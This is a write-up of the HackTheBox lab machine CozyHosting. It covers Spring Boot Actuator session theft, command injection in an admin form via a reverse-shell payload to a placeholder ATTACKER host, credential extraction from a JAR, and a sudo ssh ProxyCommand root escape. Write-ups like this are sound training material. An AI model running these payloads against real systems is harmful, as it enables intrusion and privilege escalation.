---
title: "HackTheBox: CozyHosting — Writeup"
date: 2023-09-19 10:00:00 +0200
categories: [HackThebox]
tags: [linux, ctf, Easy-HTB, spring-boot, command-injection, priv-esc]
---

## Overview

**CozyHosting** is an easy HackTheBox machine running a Spring Boot web app with an exposed Actuator endpoint that leaks a session token. The session allows access to an admin panel with a command injection vulnerability, and privilege escalation is via a SUID `ssh` binary combined with a password found in the app JAR.

---

## Recon

```bash
nmap -sC -sV -oN nmap/initial 10.10.11.230
```

```
22/tcp  open  ssh     OpenSSH 8.9p1
80/tcp  open  http    nginx 1.18.0
```

Web app — `cozyhosting.htb`. Added to `/etc/hosts`. Spring Boot application.

---

## Spring Boot Actuator Leak

Ran `ffuf` to enumerate paths:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt \
     -u http://cozyhosting.htb/FUZZ
```

Hit `/actuator/sessions` — returned active session tokens:

```json
{"kanderson":"2A9F...REDACTED..."}
```

Set the cookie in browser → logged in as `kanderson` (admin).

---

## Command Injection

Admin panel has a "Connection Settings" form that runs `ssh` internally:

```
Hostname: 10.10.x.x
Username: test
```

The username is passed unsanitised to a shell command. Newline (`%0a`) breaks out of it:

```
Username: ;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'%0a
```

Reverse shell received as `app`.

---

## Password Extraction from JAR

Found `cloudhosting-0.0.1.jar` in `/app`. Extracted it and grepped for credentials:

```bash
unzip -d jar_extracted cloudhosting-0.0.1.jar
grep -r "password" jar_extracted/BOOT-INF/classes/
```

PostgreSQL credentials found → connected and dumped users table → bcrypt hash for `admin` → cracked with hashcat → password reused by user `josh` on SSH.

---

## Privilege Escalation

```bash
sudo -l
# (root) /usr/bin/ssh *
```

GTFObins `ssh` escape:

```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

Root shell. `root.txt` retrieved.
